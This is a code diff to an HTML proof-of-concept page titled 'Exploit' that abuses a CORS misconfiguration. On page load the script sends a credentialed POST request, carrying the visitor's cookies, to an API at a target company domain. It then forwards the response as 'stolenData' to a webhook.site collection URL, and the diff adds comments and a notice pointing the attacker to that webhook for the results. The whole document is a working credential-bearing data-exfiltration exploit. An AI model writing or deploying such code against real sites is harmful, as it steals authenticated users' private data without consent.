@@ -1,13 +1,19 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS Exploit Debug</title>
+    <title>Exploit</title>
     <script>
-        console.log("Exploit script loaded.");
+        // Log the start of the script
+        console.log("Exploit script loaded and running...");
 
-        fetch("https://api.company-target.com/api/v3/ip.json?referrer=&page=https%3A%2F%2Fevgen.appsflyer.com%2F%3Furl%3Dgoogle.com&page_title=In-app%20event%20generator", {
+        // Define the target endpoint and payload
+        const targetURL = "https://api.company-target.com/api/v3/ip.json?referrer=&page=https%3A%2F%2Fevgen.appsflyer.com%2F%3Furl%3Dgoogle.com&page_title=In-app%20event%20generator";
+        const webhookURL = "https://webhook.site/90a9a04b-72c9-4653-a2c2-f0a66c64559c";
+
+        // Craft the POST request to the target server
+        fetch(targetURL, {
             method: "POST",
-            credentials: "include", // Include cookies for the request
+            credentials: "include", // Include cookies with the request
             headers: {
                 "Content-Type": "text/plain;charset=UTF-8",
                 "Origin": "https://varad4-0-4.github.io/covid19partnersplatform-dev/"
@@ -19,24 +25,30 @@
         })
         .then(response => {
             console.log("Response received:", response);
-            return response.text();
+            return response.text(); // Parse the response body
         })
         .then(data => {
-            console.log("Data extracted:", data);
-            // Send stolen data to your server
-            fetch("https://varad4-0-4.github.io/covid19partnersplatform-dev/log", {
+            console.log("Extracted data:", data);
+
+            // Send the extracted data to the Webhook.site endpoint
+            fetch(webhookURL, {
                 method: "POST",
                 headers: {
                     "Content-Type": "application/json"
                 },
-                body: JSON.stringify({ stolenData: data })
-            });
+                body: JSON.stringify({
+                    stolenData: data
+                })
+            })
+            .then(() => console.log("Data successfully sent to Webhook.site"))
+            .catch(err => console.error("Failed to send data to Webhook.site:", err));
         })
-        .catch(err => console.error("Exploit failed:", err));
+        .catch(err => console.error("Exploit failed to fetch target data:", err));
     </script>
 </head>
 <body>
     <h1>Loading Exploit...</h1>
+    <p>If you see this message, the exploit is running. Check the browser console and Webhook.site for results.</p>
 </body>
 </html>
 
